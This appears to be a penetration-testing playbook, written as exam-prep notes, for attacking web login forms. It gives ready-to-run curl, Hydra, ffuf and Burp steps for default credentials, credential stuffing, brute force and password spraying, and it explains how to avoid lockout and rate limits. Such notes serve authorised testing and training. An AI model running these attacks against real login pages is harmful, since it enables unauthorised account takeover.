
Credential-based attacks against discovered login forms. Entry from [[Web Attack Checksheet]] sub-block 1.6 on login-form observation (fires Sections 1-4) and sub-block 1.14 on populated `users_<host>.txt` (fires Section 5).

Sister files: [[Login Bypass Techniques]] (injection, tampering, direct access), [[Username Enumeration]] (populates `users_<host>.txt`), [[Session Cookie Attacks]] (session/JWT), [[MFA Bypass]] (multi-step).

Ordering: default creds first (30-sec cost, high P on OSCP+); credential stuffing next (if external pair list); hit-and-hope brute force with common usernames (no enum required); password spray (one password × many users, evades lockout); enum-fed brute force last (requires target-enumerated usernames from [[Username Enumeration]]). Pre-flight checks cross-cut all sections — run once before Section 1.

---

## Pre-flight checks

Run once before Sections 1-5. Establishes CSRF handling, rate-limit posture, and the failure signal used by all subsequent attacks.

### CSRF token detection

`curl -s http://<host>:<port>/<login_path> | grep -oiE 'name=["'"'"']?(_?csrf|authenticity_token|__requestverificationtoken)[^>]*' || echo "NO_CSRF_TOKEN"`

Route on output:

- Token field name printed → CSRF protection present. Naive Hydra/ffuf will fail (token changes per request). Switch each attack Section below to Burp Intruder with session-handling macro; see [[Automating Fresh State in Burp]].
- `NO_CSRF_TOKEN` → any tool safe (Hydra, ffuf, Burp).

### Rate limiting / account lockout probe

Send 10 known-bad login attempts against a known-invalid username. Watch for status changes, delays, or size deltas:

```bash
for i in $(seq 1 10); do curl -sX POST -o /dev/null -w '[%{http_code}][size:%{size_download}][time:%{time_total}s]\n' -d 'username=xyzabc123xxx&password=wrong' http://<host>:<port>/<login_path>; done
```

Route on output:

- Any HTTP 429 → hard rate limit. Set `<threads>` = 1 for all attacks; consider `-W <delay>` (Hydra) between requests.
- Response `time_total` grows across requests → soft throttle. `<threads>` = 1.
- Response `size` changes at request N → possible lockout at threshold N. Keep any single-username attack under N/2 attempts. Password spray (Section 4) unaffected.
- No changes across all 10 → no lockout observed. `<threads>` = 10 (ffuf) or 4 (Hydra) safe.

Save `<threads>` value for Sections 2-5.

### Success-detection baseline

Send one deliberately invalid login. Response becomes `<fail_signal>` referenced by Sections 1-5.

`curl -sX POST -i -d 'username=xyzabc123xxx&password=wrong' http://<host>:<port>/<login_path>`

From output, log:

- HTTP status of failure (typical: 200 with error, 401, 302 redirect back to /login)
- Response body: identify unique string present ONLY in failure responses (e.g. `Invalid credentials`, `Login incorrect`, `Password incorrect`) — this is `<fail_signal>`
- Response length in bytes (fallback if no clean string)
- Set-Cookie behaviour (failure typically sets no session; success sets one)

Save `<fail_signal>` (or size/status) for Sections 1-5.

---

## 1. Default credentials

Fastest highest-EV attempt. 30 seconds via automated loop.

**Universal pairs (loop):**

```bash
while IFS=: read -r u p; do
  echo -n "$u:$p → "
  curl -sX POST -d "username=$u&password=$p" http://<host>:<port>/<login_path> | grep -q '<fail_signal>' && echo "fail" || echo "SUCCESS"
done << 'EOF'
admin:admin
admin:password
admin:
root:root
root:toor
root:password
admin:admin123
administrator:administrator
administrator:password
test:test
guest:guest
user:user
EOF
```

Any line printing `SUCCESS` → verified success → Section 6.

**Framework-specific (if framework identified via WAC 1.1-1.4).** Add to the loop above:

- WordPress → `admin:admin`, `admin:password`, `wpadmin:wpadmin`
- Tomcat manager → `tomcat:tomcat`, `tomcat:s3cret`, `admin:tomcat`, `role1:role1`
- PHPMyAdmin → `root:`, `root:root`, `root:password`
- Jenkins → `admin:admin`, `admin:password`
- Grafana → `admin:admin`
- Joomla → `admin:admin`, `admin:password`
- Drupal → `admin:admin`
- Splunk → `admin:changeme`

Route:

- Any `SUCCESS` line → Section 6
- All `fail` → 2

---

## 2. Credential stuffing

Try known/plausibly-leaked username:password pairs (from GitHub search, HIBP, engagement scope, prior foothold on adjacent service).

Precondition: pair list available.

Precondition unmet (no pair list at all) → 3.

**Prep pair list.** Common leak format is `<username>:<password>` per line. Split into aligned files:

```bash
cut -d: -f1 pairs.txt > users.txt
cut -d: -f2- pairs.txt > passwords.txt
```

**Replayability check:** [[Testing Replayability in Burp]].

- Replayable AND no CSRF → ffuf pitchfork below
- Not statically replayable OR CSRF present → Burp Intruder Pitchfork below

**ffuf pitchfork (aligned pairs, one attack per row):**

`ffuf -w users.txt:U -w passwords.txt:P -mode pitchfork -X POST -d 'username=U&password=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fr '<fail_signal>' -t <threads> -o ffuf_stuff_<host>_<port>.json -of json`

**Burp Intruder Pitchfork:**

1. Capture normal login request → Intruder.
2. Mark username and password form-field values as payload positions.
3. Attack type: Pitchfork.
4. Payload set 1 = users.txt, set 2 = passwords.txt (line-aligned).
5. If CSRF: configure Session Handling Rules per [[Automating Fresh State in Burp]].
6. Options → Grep-Match on `<fail_signal>`. After attack, sort by absence to find success.
7. Start.

Route:

- Any entry without `<fail_signal>` (or different status/length) → verify manually → Section 6
- All pairs return `<fail_signal>` → 3

---

## 3. Hit-and-hope brute force

Common usernames × common passwords. No target-specific enumeration required. Highest EV among "try before enumeration" attacks — usernames like `admin`, `administrator`, `root` frequently exist on OSCP+ boxes.

Precondition: `<threads>` established from Pre-flight lockout probe. If lockout risk high, skip to Section 4 (password spray evades per-user lockout).

**Hydra with common user/password shortlists:**

`hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -e nsr <host> http-post-form '/<login_path>:username=^USER^&password=^PASS^:F=<fail_signal>' -t <threads> -o hydra_hitand_<host>_<port>.txt -V`

`-e nsr` also tries: empty password, same-as-user, reversed-user.

**ffuf cluster bomb variant:**

`ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:U -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:P -mode clusterbomb -X POST -d 'username=U&password=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fr '<fail_signal>' -t <threads> -o ffuf_hitand_<host>_<port>.json -of json`

Route:

- Hydra prints `[<port>][http-post-form] host: <host>   login: <user>   password: <pass>` line, OR ffuf shows entry without `<fail_signal>` → verify manually → Section 6
- Exhausted, no success → 4

---

## 4. Password spray

One common password against many users. Evades per-user account lockout (each user gets exactly one attempt). Effective against organisations with weak default password policies.

Precondition: username candidate list — use `/usr/share/seclists/Usernames/top-usernames-shortlist.txt` if `users_<host>.txt` empty, use both concatenated if populated.

**Spray common passwords one at a time:**

```bash
for p in "Password1" "Password123" "Welcome1" "Winter2025!" "Summer2025!" "Autumn2025!" "Spring2025!" "Company123" "changeme"; do
  echo "=== spraying: $p ==="
  hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p "$p" <host> http-post-form '/<login_path>:username=^USER^&password=^PASS^:F=<fail_signal>' -t <threads> -o "hydra_spray_${p}.txt" -V 2>/dev/null | grep -i 'login:'
done
```

Adjust seasonal passwords to current year. Add company-name variants if known (e.g. `<company>123`, `<company>2025`).

Route:

- Any spray line prints `login: <user>` → verify manually → Section 6
- All sprays return no hits → 5 (if `users_<host>.txt` populated) OR exhausted (if empty)

---

## 5. Enum-fed brute force

Full password wordlist × target-enumerated usernames. Fires from WAC sub-block 1.14 when `users_<host>.txt` is populated by [[Username Enumeration]] or IDOR.

Precondition: `users_<host>.txt` contains one or more entries. If empty → this section does not fire.

**Replayability check:** [[Testing Replayability in Burp]].

- Replayable AND no CSRF → Hydra or ffuf below
- Not statically replayable OR CSRF present → Burp Intruder Cluster Bomb (mirror Section 2 Burp path with Cluster Bomb attack type instead of Pitchfork)

**Hydra with enumerated user list:**

`hydra -L users_<host>.txt -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -e nsr <host> http-post-form '/<login_path>:username=^USER^&password=^PASS^:F=<fail_signal>' -t <threads> -o hydra_enum_<host>_<port>.txt -V`

**ffuf cluster bomb variant:**

`ffuf -w users_<host>.txt:U -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt:P -mode clusterbomb -X POST -d 'username=U&password=P' -H 'Content-Type: application/x-www-form-urlencoded' -u http://<host>:<port>/<login_path> -fr '<fail_signal>' -t <threads> -o ffuf_enum_<host>_<port>.json -of json`

**Target-derived wordlist (Cewl).** If common wordlists exhaust with no hit, generate target-specific wordlist:

`cewl -d 2 -m 5 -w cewl_<host>.txt http://<host>:<port>/`

Re-run Hydra/ffuf above with `-P cewl_<host>.txt`.

Route:

- Success line printed → verify manually → Section 6
- All combinations exhausted → return to [[Web Attack Checksheet]] sub-block after 1.14

---

## 6. Post-success routing

On verified successful login (recovered `<user>:<pass>`):

1. Log to `route_<ip>.txt`:

    `printf '[Credential Attacks] APPLIED: creds recovered <user>:<pass> on <host>:<port><login_path>\n' >> route_<ip>.txt`

2. Save to `creds_<host>.txt` for cross-service reuse:

    `echo '<user>:<pass>' >> creds_<host>.txt`

3. Capture session cookie from successful response:

    `curl -sX POST -i -d 'username=<user>&password=<pass>' http://<host>:<port>/<login_path> | grep -i '^Set-Cookie:'`

4. Route by post-login surface:

- Session cookie set (opaque OR JWT-shaped) → use in `Cookie:` header for authenticated requests; re-walk [[Web Attack Checksheet]] sub-blocks 1.6-1.13 authenticated (often reveals admin surface / additional routes invisible unauth)
- JWT-shaped cookie (three base64 segments dot-separated) → also consider [[Session Cookie Attacks]] (JWT branch) for privilege escalation via token forge
- Admin surface reached with RCE-viable feature (plugin/theme upload, arbitrary file upload, command exec panel) → [[File Upload]] or relevant WAC technique
- Direct RCE / shell obtained via authenticated feature → escalate to [[Linux Privilege Escalation Checksheet]] / [[Windows Privilege Escalation Checksheet]]
- Same credentials work against other services on target (SSH, database, RDP) → try laterally per [[MASTER WORKFLOW/Step 6. Vulnerability Analysis]] Pass 2/3 per-service workflows

---

## Exhaustion

Sections 1-5 all exhausted without foothold:

- If entered from WAC 1.5 → continue Step 1 walking (1.7 register form, then 1.8 forgot-password, etc.)
- If entered from WAC 1.14 → return to [[Web Attack Checksheet]] Step 5 (deferred low-EV sweep)
